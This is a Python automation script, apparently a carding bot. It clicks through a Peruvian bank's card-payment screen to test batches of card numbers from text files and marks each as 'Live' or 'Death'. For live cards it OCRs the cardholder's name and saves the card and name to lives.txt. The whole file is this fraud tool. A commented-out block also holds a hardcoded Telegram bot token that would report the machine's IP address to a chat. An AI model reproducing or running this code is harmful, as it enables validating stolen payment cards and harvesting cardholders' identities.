import pyautogui 
import time
import datetime
import pytesseract
from PIL import Image
import pyperclip3 as pc
from colorama import init,Fore,Back,Style
import re #Para separar los nombres y apellidos

init()
try:
	import pytesseract
	pytesseract.pytesseract.tesseract_cmd = r"C:\Tesseract-OCR\tesseract.exe"
	coords = 286,414,245,31
	coords2 = 289,447,249,33
except: 
	print("************")
try:
	import pytesseract
	pytesseract.pytesseract.tesseract_cmd = r"D:\Tesseract-OCR\tesseract.exe"
	coords = 286,414,245,31
	coords2 = 289,447,249,33
except: 
	print("---- -------")

#try:
	#from requests import get
	#import telegram
	#import webbrowser

	#bot_token = '5436302048:AAET9-hW1YuaAKDBS70Pn5a0IqkKkxUICp0'
	#chat_id = '1850445278'
	#bot = telegram.Bot(token=bot_token)

	#ip =get("https://api.ipify.org/").text
	#print("your ip :", ip)
	#bot.send_message(chat_id=chat_id, text = "Caja piura test Mak: "+ ip)

def click (pos,click = 1 ):
	pyautogui.moveTo(pos)
	pyautogui.click(clicks=click)
def borrar(i):
	for i in range (1,i):
		pyautogui.press('backspace')
def run():
	time.sleep(0.4)
	pyautogui.click(129,321) #cuenta origen
	time.sleep(0.4)
	pyautogui.click(253,588) #elige la cuenta de orien
	time.sleep(0.3)
	pyautogui.click(231,420)# banco
	time.sleep(0.2)
	pyautogui.click(248,494)# elige el bancoi
	#tarj next
	time.sleep(0.2)
	pyautogui.click(360,593) # monto a pagar
	time.sleep(0.3)
	pyautogui.typewrite("11")
	time.sleep(0.4)
	pyautogui.click(465,999)#listo
	time.sleep(0.4)
	pyautogui.click(52,759) #marcar casilla
	time.sleep(0.4)
	#Continuar para despues es 

def buscarnumero(numero):
	image = "./imagenes/"+str(numero) + '.png'
	loc = None
	#time.sleep(0.5)
	print(numero)
	while loc is None:
		time.sleep(0.1) # para ver	
		loc = pyautogui.locateOnScreen(image,grayscale=True, confidence=0.95, region=(0,753,568,289))
		#print(loc)
	pyautogui.moveTo(loc)
	pyautogui.click()

def login():
	for j in range (1,7):
		buscarnumero(j)
		time.sleep(0.3)
def IncioLogin():
	pyautogui.click(588,1005)
	time.sleep(0.3)
	pyautogui.click(468,99)
	time.sleep(0.3)
	pyautogui.click(495,546)

	image = "./imagenes/Entrar.png"
	time.sleep(4)
	loc = None
	#time.sleep(0.5)
	while loc is None:
		time.sleep(0.1) # para ver	
		loc = pyautogui.locateOnScreen(image,grayscale=True, confidence=0.95, region=(0,0,597,688))
		#print(loc)
	print("Logeandose...")
	time.sleep(0.3)

	pyautogui.click(269,414) #click en clave de inter
	time.sleep(1)
	login()
	time.sleep(0.5)
	pyautogui.click(279,494) #ingresar
	time.sleep(2)
	pyautogui.click(280,991)# en otro momento
	time.sleep(1.3)
	pyautogui.click(285,1012) #pagos
	time.sleep(0.3)

#time.sleep(1)
#login()
#input("Pipipi")
#time.sleep(3)

#arhivo_user = open("user.txt","r")
#textoUser = arhivo_user.readlines()
#arhivo_user.close()

#clave1 = textoUser[0].rstrip()
#clave2 = textoUser[1].rstrip()
#clave3 = textoUser[2].rstrip()
print(Fore.GREEN)
#print("██████╗░░█████╗░███╗░░██╗  ░█████╗░░█████╗░███╗░░██╗  ██████╗░░█████╗░██╗░░░░░██╗░░░░░░█████╗░")
#print("██╔══██╗██╔══██╗████╗░██║  ██╔══██╗██╔══██╗████╗░██║  ██╔══██╗██╔══██╗██║░░░░░██║░░░░░██╔══██╗")
#print("██████╔╝███████║██╔██╗██║  ██║░░╚═╝██║░░██║██╔██╗██║  ██████╔╝██║░░██║██║░░░░░██║░░░░░██║░░██║")
#print("██╔═══╝░██╔══██║██║╚████║  ██║░░██╗██║░░██║██║╚████║  ██╔═══╝░██║░░██║██║░░░░░██║░░░░░██║░░██║")
#print("██║░░░░░██║░░██║██║░╚███║  ╚█████╔╝╚█████╔╝██║░╚███║  ██║░░░░░╚█████╔╝███████╗███████╗╚█████╔╝")
#print("╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚══╝  ░╚════╝░░╚════╝░╚═╝░░╚══╝  ╚═╝░░░░░░╚════╝░╚══════╝╚══════╝░╚════╝░")
print("──▄────▄▄▄▄▄▄▄────▄───")
print("─▀▀▄─▄█████████▄─▄▀▀──") 
print("─────██─▀███▀─██──────")
print("───▄─▀████▀████▀─▄────")
print("─▀█────██▀█▀██────█▀──")


teequiste =input("txt?: ")
logeo = input("Logearse? ")
#print("******* Para el chipi de chipis CrackMovi ********")
print(Fore.CYAN)
input("Presione 'Enter' para continuar")
print(Style.RESET_ALL)


print("\n")
print("Corriendo Bot")
print("3")
time.sleep(0.5)
print("2")
time.sleep(0.5)
print("1")
time.sleep(0.5)



contador =0
linealote = 0
contadorParaLogeo = 0 
confirmarDatos = "./imagenes/confirmarDatos.png"
img_entendi = './imagenes/img_entendi.png'
expirado = './imagenes/expirado.png'
runAcceder = './imagenes/runAcceder.png'

if logeo == 'si':
	IncioLogin()

with open ('./lotes/'+teequiste+'.txt') as texto:
	for x in texto:
		print(Fore.YELLOW)
		print("========================================================================================")
		print(Style.RESET_ALL)

		linealote = linealote + 1
		
		time.sleep(0.2)
		#pyautogui.click(209,372)# pago de tarjetas de otro banco
		pyautogui.click(258,369)# pago de tarjetas de otro banco 2
		z = None
		p = None
		time.sleep(1)
		p = pyautogui.locateOnScreen(expirado,grayscale=True,confidence=0.90, region=(101,394,346,315)) 
		if (p != None):
			pyautogui.click(355,654) # seguir en la sesion Si
			print("Continuar opcion SI")
			time.sleep(0.5)

		
		while (z is None):# Un " Y " poqe si no cumple 1 se rompe el bucle
			time.sleep(0.1)
			z = pyautogui.locateOnScreen(runAcceder,grayscale=True,confidence=0.95, region=(0,0,579,533)) 
			contador = contador + 1
			if (z != None):
				break
			if contador > 200: # Por si no encuyentra ninguno
				print("Reiniciando posible error")
				IncioLogin()
				time.sleep(0.2)
				pyautogui.click(258,369)# pago de tarjetas de otro banco 2
				time.sleep(1)

				contador = 0
				contadorParaLogeo = 0
				break
		#time.sleep(2)
		run() #empezar a logearse

		time.sleep(0.4)
		pc.copy(x) #Copiando los ultimos digiutos
		time.sleep(0.1)
		pyautogui.click(243,504)
		time.sleep(0.3)
		pyautogui.hotkey('ctrl', 'v')
		time.sleep(0.3)
		pyautogui.click(165,706) #glosa
		time.sleep(0.3)
		pyautogui.click(271,946) #continuar

		time.sleep(0.2)

		contador = 0
		b = None
		d = None

		p = None
		p = pyautogui.locateOnScreen(expirado,grayscale=True,confidence=0.9, region=(101,394,346,315)) 
		if (p != None):
			pyautogui.click(355,654) # seguir en la sesion Si
			print("Continuar opcion SI")
			time.sleep(0.5)

		time.sleep(1)

		while (b is None) and (d is None):# Un " Y " poqe si no cumple 1 se rompe el bucle

			b = pyautogui.locateOnScreen(confirmarDatos,grayscale=True,confidence=0.9, region=(0,63,550,342)) 
			d = pyautogui.locateOnScreen(img_entendi, grayscale=True, confidence=0.9, region=(101,394,346,315))
			#print(b,"b")
			#print (d,"d")
			if (b != None):
				break
			if contador > 150: # Por si no encuyentra ninguno
				print("reseteando")
				contador = 0
				run()
				time.sleep(0.3)
				pyautogui.click(165,706) #glosa
				time.sleep(0.3)
				pyautogui.click(271,946) #continuar

			contador += 1

		#time.sleep(0.1)
		if d!=None: # Si no es live

			print("N.", linealote ,": "+ x.rstrip())
			print(Fore.RED+"---------------------> [ Death ]");

			print(Style.RESET_ALL)

			time.sleep(0.3)
			pyautogui.click(d)
			time.sleep(0.4)

			#time.sleep(0.3)
		if  (b !=None): # Por si es LIVE:
			print ('\a')
			
			#Queriendo guardar el nombre:
			ImagNombre = pyautogui.screenshot(region= (coords)) # d pc
			ImagNombre2 = pyautogui.screenshot(region= (coords2)) # d pc
			#ImagNombre = pyautogui.screenshot(region= (281,167,250,20)) # Disco c lap
			texNombre = pytesseract.image_to_string( ImagNombre , config= '--psm 7 -c tessedit_char_whitelist= ABCDEFGHIJKLMNOPQRSTUVWXYZ')
			texNombre2 = pytesseract.image_to_string( ImagNombre2 , config= '--psm 7 -c tessedit_char_whitelist= ABCDEFGHIJKLMNOPQRSTUVWXYZ')

			texNombre = texNombre.rstrip() +" "+ texNombre2.rstrip()
			texNombre = texNombre.replace(".","")
			texNombre = texNombre.replace("-","")

			print("N.", linealote ,": "+x.rstrip()+ "  |  " +texNombre.rstrip())
			print(Fore.GREEN+"-----------------------------------> [ Live ]");
			print(Style.RESET_ALL)
				

			lives = open("lives.txt","a")
			lives.write(x.rstrip() + "  |  " +texNombre.rstrip() )# escribir en el block
			lives.write("\n")
			lives.close()

			pyautogui.click(535,92)
			time.sleep(0.4)
			pyautogui.click(354,603) #salir confirmar
			time.sleep(0.5)


		ultimo = open("registro.txt","w")
		#ultimo.write("El ultimo calado de lote es: ")
		ultimo.write(x.rstrip()) # escribir en el block
		ultimo.write("\n")
		ultimo.close()

		#Reiniciando
		contadorParaLogeo = contadorParaLogeo + 1
		if (contadorParaLogeo == 40):
			contadorParaLogeo = 0
			IncioLogin()
			


print("Programa finalizado")
print("se quedo en la linea: ", linealote)
print("*****************")
print("Presione 'Enter' para Finalizar")
input()



